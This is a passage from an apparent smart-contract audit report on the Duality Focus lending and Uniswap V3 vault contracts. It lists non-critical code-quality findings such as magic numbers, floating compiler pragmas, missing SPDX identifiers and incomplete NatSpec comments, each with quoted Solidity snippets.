view\n        returns (\n            uint256,\n            uint256,\n            uint256\n```\n6. File: contracts/compound_rari_fork/Comptroller.sol (line [1064](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1064))\n```solidity\n    function _setPriceOracle(PriceOracle newOracle) public returns (uint256) {\n```\n7. File: contracts/compound_rari_fork/Comptroller.sol (line [1082](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1082))\n```solidity\n    function _setTickOracle(TickOracle newTickOracle) public returns (uint256) {\n```\n8. File: contracts/compound_rari_fork/Comptroller.sol (line [1105](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1105))\n```solidity\n    function _setUniV3LpVault(IUniV3LpVault newVault) public returns (uint256) {\n```\n9. File: contracts/compound_rari_fork/Comptroller.sol (line [1390](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1390))\n```solidity\n    function _setPauseGuardian(address newPauseGuardian) public returns (uint256) {\n```\n10. File: contracts/compound_rari_fork/Comptroller.sol (line [1407](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1407))\n```solidity\n    function _setMintPaused(CToken cToken, bool state) public returns (bool) {\n```\n11. File: contracts/compound_rari_fork/Comptroller.sol (line [1417](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1417))\n```solidity\n    function _setBorrowPaused(CToken cToken, bool state) public returns (bool) {\n```\n12. File: contracts/compound_rari_fork/Comptroller.sol (line [1427](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1427))\n```solidity\n    function _setTransferPaused(bool state) public returns (bool) {\n```\n13. File: contracts/compound_rari_fork/Comptroller.sol (line [1436](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1436))\n```solidity\n    function _setSeizePaused(bool state) public returns (bool) {\n```\n14. File: contracts/compound_rari_fork/Comptroller.sol (line [1445](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1445))\n```solidity\n    function _become(Unitroller unitroller) public {\n```\n15. File: contracts/compound_rari_fork/Comptroller.sol (line [1502](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1502))\n```solidity\n    function getAllMarkets() public view returns (CToken[] memory) {\n```\n16. File: contracts/compound_rari_fork/Comptroller.sol (line [1511](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1511))\n```solidity\n    function getAllBorrowers() public view returns (address[] memory) {\n```\n17. File: contracts/compound_rari_fork/CErc20.sol (lines [20-26](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CErc20.sol#L20-L26))\n```solidity\n    function initialize(\n        address underlying_,\n        ComptrollerInterface comptroller_,\n        InterestRateModel interestRateModel_,\n        string memory name_,\n        string memory symbol_,\n        uint256 reserveFactorMantissa_\n```\n\n### `constant`s should be defined rather than using magic numbers\n\n1. File: contracts/vault_and_oracles/UniV3LpVault.sol (line [322](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L322))\n```solidity\n            block.timestamp + 200\n```\n2. File: contracts/vault_and_oracles/UniV3LpVault.sol (line [624](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L624))\n```solidity\n            ISwapRouter.ExactInputParams(swapPath, address(this), block.timestamp + 200, amount, 0)\n```\n3. File: contracts/vault_and_oracles/UniV3LpVault.sol (line [661](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L661))\n```solidity\n                block.timestamp + 200\n```\n4. File: contracts/vault_and_oracles/UniV3LpVault.sol (line [676](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L676))\n```solidity\n            INonfungiblePositionManager.DecreaseLiquidityParams(tokenId, liquidity, 0, 0, block.timestamp + 200)\n```\n5. File: contracts/vault_and_oracles/UniV3LpVault.sol (line [810](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L810))\n```solidity\n            (swapPath.toAddress(0) == tokenStart && swapPath.toAddress(swapPath.length - 20) == tokenEnd);\n```\n6. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [117](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L117))\n```solidity\n        return (_price(underlying).mul(1e18)).div(10**uint256(IERC20Detailed(underlying).decimals()));\n```\n7. File: contracts/vault_and_oracles/MasterPriceOracle.sol (line [110](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/MasterPriceOracle.sol#L110))\n```solidity\n        if (underlying == WETH_ADDRESS) return 1e18;\n```\n8. File: contracts/vault_and_oracles/MasterPriceOracle.sol (line [125](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/MasterPriceOracle.sol#L125))\n```solidity\n        if (underlying == WETH_ADDRESS) return 1e18;\n```\n9. File: contracts/compound_rari_fork/Comptroller.sol (line [1524](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1524))\n```solidity\n            cToken.reserveFactorMantissa() == 1e18;\n```\n10. File: contracts/compound_rari_fork/CErc20.sol (line [29](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CErc20.sol#L29))\n```solidity\n        uint256 initialExchangeRateMantissa_ = 0.2e18;\n```\n\n### Multiple `address` mappings can be combined into a single `mapping` of an `address` to a `struct`, where appropriate\n\n1. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (lines [57-60](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L57-L60))\n```solidity\n    mapping(address => address) public referencePools;\n\n    // mapping from uni v3 pool to bool of whether or not they are being utilized\n    mapping(address => bool) public isSupportedPool;\n```\n\n### Non-library/interface files should use fixed compiler versions, not floating ones\n\n1. File: contracts/vault_and_oracles/UniV3LpVault.sol (line [1](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L1))\n```solidity\npragma solidity ^0.7.6;\n```\n2. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [1](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L1))\n```solidity\npragma solidity ^0.7.6;\n```\n3. File: contracts/vault_and_oracles/MasterPriceOracle.sol (line [2](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/MasterPriceOracle.sol#L2))\n```solidity\npragma solidity ^0.7.6;\n```\n4. File: contracts/vault_and_oracles/FlashLoan.sol (line [1](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/FlashLoan.sol#L1))\n```solidity\npragma solidity ^0.7.6;\n```\n5. File: contracts/compound_rari_fork/CToken.sol (line [1](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CToken.sol#L1))\n```solidity\npragma solidity ^0.5.16;\n```\n\n\n### File does not contain an SPDX Identifier\n\n1. File: contracts/libs/LpBreakdownLibrary.sol (line [0](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/libs/LpBreakdownLibrary.sol#L0))\n```solidity\npragma solidity ^0.7.6;\n```\n2. File: contracts/vault_and_oracles/UniV3LpVault.sol (line [0](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L0))\n```solidity\npragma solidity ^0.7.6;\n```\n3. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [0](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L0))\n```solidity\npragma solidity ^0.7.6;\n```\n4. File: contracts/vault_and_oracles/FlashLoan.sol (line [0](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/FlashLoan.sol#L0))\n```solidity\npragma solidity ^0.7.6;\n```\n5. File: contracts/compound_rari_fork/CToken.sol (line [0](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CToken.sol#L0))\n```solidity\npragma solidity ^0.5.16;\n```\n\n### File is missing NatSpec\n\n1. File: contracts/vault_and_oracles/FlashLoan.sol (line [0](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/FlashLoan.sol#L0))\n```solidity\npragma solidity ^0.7.6;\n```\n\n### NatSpec is incomplete\n\n1. File: contracts/libs/LpBreakdownLibrary.sol (lines [31-59](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/libs/LpBreakdownLibrary.sol#L31-L59))\n```solidity\n    /**\n     * @dev gets the breakdown of a LP Token in the pool's underlying tokens, utilizing an instantaneous or TWAP tick\n     * @param tokenId The tokenId to get a breakdown of\n     * @param isTwap Whether to use a TWAP or instantaneous tick for calculations\n     * @return token0 The first token of tokenId's pool\n     *         token1 The second token of tokenId's pool\n     *         amountToken0Fees Amount of token0 in fees\n     *         amountToken1Fees Amount of token1 in fees\n     *         amountToken0Liquidity Amount of token0 contributing to liquidity value\n     *         amountToken1Liquidity Amount of token1 contributing to liquidity value\n     *         amountLiquidity Amount of liquidity that tokenId represents\n     */\n    function _getTokenBreakdown(\n        uint256 tokenId,\n        bool isTwap,\n        address nfpManager,\n        address factory,\n        address tickOracle\n    )\n        internal\n        view\n        returns (\n            address token0,\n            address token1,\n            uint256 amountToken0Fees,\n            uint256 amountToken1Fees,\n            uint256 amountToken0Liquidity,\n            uint256 amountToken1Liquidity,\n            uint256 amountLiquidity\n```\nMissing: `@param nfpManager` `@param factory` `@param tickOracle` \n\n2. File: contracts/libs/LpBreakdownLibrary.sol (lines [84-93](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/libs/LpBreakdownLibrary.sol#L84-L93))\n```solidity\n    /**\n     * @dev generates an in-memory struct of position information of the tokenId to be used for computations\n     * @param tokenId The tokenId to generate position information of\n     * @return vars The in-memory struct containing all most recently updated information about our tokenId\n     */\n    function _generateTokenValueLocalVars(\n        uint256 tokenId,\n        address nfpmManager,\n        address factory\n    ) internal view returns (TokenValueLocalVars memory vars) {\n```\nMissing: `@param nfpmManager` `@param factory` \n\n3. File: contracts/libs/LpBreakdownLibrary.sol (lines [121-130](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/libs/LpBreakdownLibrary.sol#L121-L130))\n```solidity\n    /**\n     * @dev calculates updated fees for a tokenId position given old stats\n     * @param vars The in-memory struct containing all most recently updated information about our tokenId\n     * @return tokensOwed0 The updated amount of token0 collected in fees\n     *         tokensOwed1 The updated amount of token1 collected in fees\n     */\n    function _getTokensOwed(TokenValueLocalVars memory vars, int24 tick)\n        internal\n        view\n        returns (uint256 tokensOwed0, uint256 tokensOwed1)\n```\nMissing: `@param tick` \n\n4. File: contracts/libs/UniswapTwapLibrary.sol (lines [26-41](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/libs/UniswapTwapLibrary.sol#L26-L41))\n```solidity\n    /**\n     * @notice get twap converted with base & quote token decimals\n     * @dev if period is longer than the current timestamp - first timestamp stored in the pool, this will revert with \"OLD\"\n     * @param _pool uniswap pool address\n     * @param _base base currency. to get eth/usd price, eth is base token\n     * @param _quote quote currency. to get eth/usd price, usd is the quote currency\n     * @param _period number of seconds in the past to start calculating time-weighted average\n     * @return price of 1 base currency in quote currency. scaled by 1e18\n     */\n    function getTwap(\n        address _pool,\n        address _base,\n        address _quote,\n        uint32 _period,\n        bool _checkPeriod\n    ) internal view returns (uint256) {\n```\nMissing: `@param _checkPeriod` \n\n5. File: contracts/libs/LiquidityLibrary.sol (lines [17-32](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/libs/LiquidityLibrary.sol#L17-L32))\n```solidity\n    /**\n     * @notice get balances of token0 / token1 in a uniswap position\n     * @dev knowing liquidity, tick range, and current tick gives balances\n     *      Opyn team (https://github.com/opynfinance/squeeth-monorepo/blob/main/packages/hardhat/contracts/libs/VaultLib.sol)\n     * @param _tickLower address of the uniswap position manager\n     * @param _tickUpper uniswap position token id\n     * @param _tick current price tick used for calculation\n     * @return amount0 the amount of token0 in the uniswap position token\n     * @return amount1 the amount of token1 in the uniswap position token\n     */\n    function _getToken0Token1Balances(\n        int24 _tickLower,\n        int24 _tickUpper,\n        int24 _tick,\n        uint128 _liquidity\n    ) internal pure returns (uint256 amount0, uint256 amount1) {\n```\nMissing: `@param _liquidity` \n\n6. File: contracts/vault_and_oracles/UniV3LpVault.sol (lines [619-621](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L619-L621))\n```solidity\n     * @param amount The amount of the first token to swap\n     */\n    function _swap(bytes memory swapPath, uint256 amount) internal returns (uint256 amountOut) {\n```\nMissing: `@return` \n\n7. File: contracts/vault_and_oracles/UniV3LpVault.sol (lines [682-684](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L682-L684))\n```solidity\n     * @param tokenId The tokenId of the NFT we are collecting fees from\n     */\n    function _collectMax(uint256 tokenId) internal returns (uint256 amount0, uint256 amount1) {\n```\nMissing: `@return` \n\n8. File: contracts/vault_and_oracles/UniV3LpVault.sol (lines [694-701](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L694-L701))\n```solidity\n     * @param params NonfungiblePositionManager's MintParams. Acts as a passthrough except for ownership management\n     */\n    function _mint(INonfungiblePositionManager.MintParams memory params)\n        internal\n        returns (\n            uint256 tokenId,\n            uint256 amount0,\n            uint256 amount1\n```\nMissing: `@return` \n\n9. File: contracts/vault_and_oracles/UniV3LpVault.sol (lines [831-833](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L831-L833))\n```solidity\n     * @param state new value for whether deposits are paused\n     */\n    function _pauseDeposits(bool state) external override returns (bool) {\n```\nMissing: `@return` \n\n10. File: contracts/vault_and_oracles/UniV3LpVault.sol (lines [847-849](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L847-L849))\n```solidity\n     * @param state new value for whether periphery UX functions are paused\n     */\n    function _pausePeripheryFunctions(bool state) external override returns (bool) {\n```\nMissing: `@return` \n\n11. File: contracts/vault_and_oracles/UniV3LpVault.sol (lines [863-865](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L863-L865))\n```solidity\n     * @param _flashLoan the new flashLoan contract's address\n     */\n    function _setFlashLoan(address _flashLoan) external override returns (address) {\n```\nMissing: `@return` \n\n12. File: contracts/vault_and_oracles/UniV3LpVault.sol (lines [875-877](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L875-L877))\n```solidity\n     * @param _userTokensMax the new value for userTokensMax\n     */\n    function _setUserTokensMax(uint256 _userTokensMax) external override returns (uint256) {\n```\nMissing: `@return` \n\n13. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (lines [62-78](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L62-L78))\n```solidity\n    /**\n     * @dev Constructor to initialize state variables.\n     * @param _tokens The underlying ERC20 token addresses to link to `_pools`.\n     * @param _pools The Uniswap V3 Pools to be assigned to `_tokens`.\n     * @param _twapPeriod The period used to calculate our TWAP from the Uni V3 pool\n     * @param _admin The admin who can assign pools to tokens.\n     * @param _canAdminOverwrite Controls if `admin` can overwrite existing assignments of pools to tokens.\n     */\n    constructor(\n        address[] memory _tokens,\n        address[] memory _pools,\n        uint32 _twapPeriod,\n        address _wethAddress,\n        address _nfpManager,\n        address _factory,\n        address _admin,\n        bool _canAdminOverwrite\n```\nMissing: `@param _wethAddress` `@param _nfpManager` `@param _factory` \n\n14. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (lines [109-113](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L109-L113))\n```solidity\n    /**\n     * @notice Returns the price in ETH of the token underlying `cToken`.\n     * @return Price in ETH of the token underlying `cToken`, scaled by `10 ** (36 - underlyingDecimals)`.\n     */\n    function getUnderlyingPrice(CTokenInterface cToken) external view override returns (uint256) {\n```\nMissing: `@param cToken` \n\n15. File: contracts/vault_and_oracles/MasterPriceOracle.sol (lines [30-42](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/MasterPriceOracle.sol#L30-L42))\n```solidity\n    /**\n     * @dev Constructor to initialize state variables.\n     * @param underlyings The underlying ERC20 token addresses to link to `_oracles`.\n     * @param _oracles The `PriceOracle` contracts to be assigned to `underlyings`.\n     * @param _admin The admin who can assign oracles to underlying tokens.\n     * @param _canAdminOverwrite Controls if `admin` can overwrite existing assignments of oracles to underlying tokens.\n     */\n    constructor(\n        address[] memory underlyings,\n        PriceOracleInterface[] memory _oracles,\n        address _wethAddress,\n        address _admin,\n        bool _canAdminOverwrite\n```\nMissing: `@param _wethAddress` \n\n16. File: contracts/vault_and_oracles/MasterPriceOracle.sol (lines [100-105](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/MasterPriceOracle.sol#L100-L105))\n```solidity\n    /**\n     * @notice Returns the price in ETH of the token underlying `cToken`.\n     * @dev Implements the `PriceOracle` interface for Fuse pools (and Compound v2).\n     * @return Price in ETH of the token underlying `cToken`, scaled by `10 ** (36 - underlyingDecimals)`.\n     */\n    function getUnderlyingPrice(CTokenInterface cToken) external view override returns (uint256) {\n```\nMissing: `@param cToken` \n\n17. File: contracts/compound_rari_fork/CToken.sol (lines [17-33](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CToken.sol#L17-L33))\n```solidity\n    /**\n     * @notice Initialize the money market\n     * @param comptroller_ The address of the Comptroller\n     * @param interestRateModel_ The address of the interest rate model\n     * @param initialExchangeRateMantissa_ The initial exchange rate, scaled by 1e18\n     * @param name_ EIP-20 name of this token\n     * @param symbol_ EIP-20 symbol of this token\n     * @param decimals_ EIP-20 decimal precision of this token\n     */\n    function initialize(\n        ComptrollerInterface comptroller_,\n        InterestRateModel interestRateModel_,\n        uint256 initialExchangeRateMantissa_,\n        string memory name_,\n        string memory symbol_,\n        uint8 decimals_,\n        uint256 reserveFactorMantissa_\n```\nMissing: `@param reserveFactorMantissa_` \n\n18. File: contracts/compound_rari_fork/CToken.sol (lines [627-636](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CToken.sol#L627-L636))\n```solidity\n    /**\n     * @notice Sender redeems cTokens on behalf of redeemer in exchange for a specified amount of underlying asset\n     * @dev Accrues interest whether or not the operation succeeds, unless reverted\n     * @param redeemAmount The amount of underlying to receive from redeeming cTokens\n     * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n     */\n    function redeemUnderlyingBehalfInternal(address redeemer, uint256 redeemAmount)\n        internal\n        nonReentrant(false)\n        returns (uint256)\n```\nMissing: `@param redeemer` \n\n19. File: contracts/compound_rari_fork/CToken.sol (lines [1396-1401](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CToken.sol#L1396-L1401))\n```solidity\n    /**\n     * @notice Sets a new comptroller for the market\n     * @dev Internal function to set a new comptroller\n     * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n     */\n    function _setComptroller(ComptrollerInterface newComptroller) internal returns (uint256) {\n```\nMissing: `@param newComptroller` \n\n20. File: contracts/compound_rari_fork/CToken.sol (lines [1415-1420](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CToken.sol#L1415-L1420))\n```solidity\n    /**\n     * @notice accrues interest and sets a new reserve factor for the protocol using _setReserveFactorFresh\n     * @dev Admin function to accrue interest and set a new reserve factor\n     * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n     */\n    function _setReserveFactor(uint256 newReserveFactorMantissa) external nonReentrant(false) returns (uint256) {\n```\nMissing: `@param newReserveFactorMantissa` \n\n21. File: contracts/compound_rari_fork/CToken.sol (lines [1430-1435](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CToken.sol#L1430-L1435))\n```solidity\n    /**\n     * @notice Sets a new reserve factor for the protocol (*requires fresh interest accrual)\n     * @dev Admin function to set a new reserve factor\n     * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n     */\n    function _setReserveFactorFresh(uint256 newReserveFactorMantissa) internal returns (uint256) {\n```\nMissing: `@param newReserveFactorMantissa` \n\n22. File: contracts/compound_rari_fork/CToken.sol (lines [1702-1717](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CToken.sol#L1702-L1717))\n```solidity\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls).\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     * @param data The call data (encoded using abi.encode or one of its variants).\n     * @param errorMessage The revert string to return on failure.\n     */\n    function _functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n```\nMissing: `@param target` `@return` \n\n23. File: contracts/compound_rari_fork/Comptroller.sol (lines [471-479](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L471-L479))\n```solidity\n     * @param repayAmount The amount of underlying being repaid\n     */\n    function liquidateBorrowAllowed(\n        address cTokenBorrowed,\n        address cTokenCollateral,\n        address liquidator,\n        address borrower,\n        uint256 repayAmount\n    ) external returns (uint256) {\n```\nMissing: `@return` \n\n24. File: contracts/compound_rari_fork/Comptroller.sol (lines [521-529](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L521-L529))\n```solidity\n     * @param repayAmount The amount of underlying being repaid\n     */\n    function liquidateBorrowUniV3Allowed(\n        address cTokenBorrowed,\n        uint256 collateralTokenId,\n        address liquidator,\n        address borrower,\n        uint256 repayAmount\n    ) external returns (uint256) {\n```\nMissing: `@return` \n\n25. File: contracts/compound_rari_fork/Comptroller.sol (lines [573-581](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L573-L581))\n```solidity\n     * @param seizeTokens The number of collateral tokens to seize\n     */\n    function seizeAllowed(\n        address cTokenCollateral,\n        address cTokenBorrowed,\n        address liquidator,\n        address borrower,\n        uint256 seizeTokens\n    ) external returns (uint256) {\n```\nMissing: `@return` \n\n26. File: contracts/compound_rari_fork/Comptroller.sol (lines [690-702](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L690-L702))\n```solidity\n    /**\n     * @notice Determine the current account liquidity wrt collateral requirements\n     * @return (possible error code (semi-opaque),\n                account liquidity in excess of collateral requirements,\n     *          account shortfall below collateral requirements)\n     */\n    function getAccountLiquidity(address account)\n        public\n        view\n        returns (\n            uint256,\n            uint256,\n            uint256\n```\nMissing: `@param account` \n\n27. File: contracts/compound_rari_fork/Comptroller.sol (lines [715-727](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L715-L727))\n```solidity\n    /**\n     * @notice Determine the current account liquidity wrt collateral requirements\n     * @return (possible error code,\n                account liquidity in excess of collateral requirements,\n     *          account shortfall below collateral requirements)\n     */\n    function getAccountLiquidityInternal(address account)\n        internal\n        view\n        returns (\n            Error,\n            uint256,\n            uint256\n```\nMissing: `@param account` \n\n28. File: contracts/compound_rari_fork/Comptroller.sol (lines [1059-1064](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1059-L1064))\n```solidity\n    /**\n     * @notice Sets a new price oracle for the comptroller\n     * @dev Admin function to set a new price oracle\n     * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n     */\n    function _setPriceOracle(PriceOracle newOracle) public returns (uint256) {\n```\nMissing: `@param newOracle` \n\n29. File: contracts/compound_rari_fork/Comptroller.sol (lines [1100-1105](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1100-L1105))\n```solidity\n    /**\n     * @notice Sets a new UniV3LpVault for the comptroller\n     * @dev Admin function to set a new UniV3LpVault\n     * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n     */\n    function _setUniV3LpVault(IUniV3LpVault newVault) public returns (uint256) {\n```\nMissing: `@param newVault` \n\n30. File: contracts/compound_rari_fork/Comptroller.sol (lines [1518-1520](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1518-L1520))\n```solidity\n     * @param cToken The market to check if deprecated\n     */\n    function isDeprecated(CToken cToken) public view returns (bool) {\n```\nMissing: `@return` \n\n31. File: contracts/compound_rari_fork/CErc20.sol (lines [12-26](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CErc20.sol#L12-L26))\n```solidity\n    /**\n     * @notice Initialize the new money market\n     * @param underlying_ The address of the underlying asset\n     * @param comptroller_ The address of the Comptroller\n     * @param interestRateModel_ The address of the interest rate model\n     * @param name_ ERC-20 name of this token\n     * @param symbol_ ERC-20 symbol of this token\n     */\n    function initialize(\n        address underlying_,\n        ComptrollerInterface comptroller_,\n        InterestRateModel interestRateModel_,\n        string memory name_,\n        string memory symbol_,\n        uint256 reserveFactorMantissa_\n```\nMissing: `@param reserveFactorMantissa_` \n\n\n### Event is missing `indexed` fields\nEach `event` should use three `indexed` fields if there are three or more fields\n\n1. File: contracts/vault_and_oracles/MasterPriceOracle.sol (line 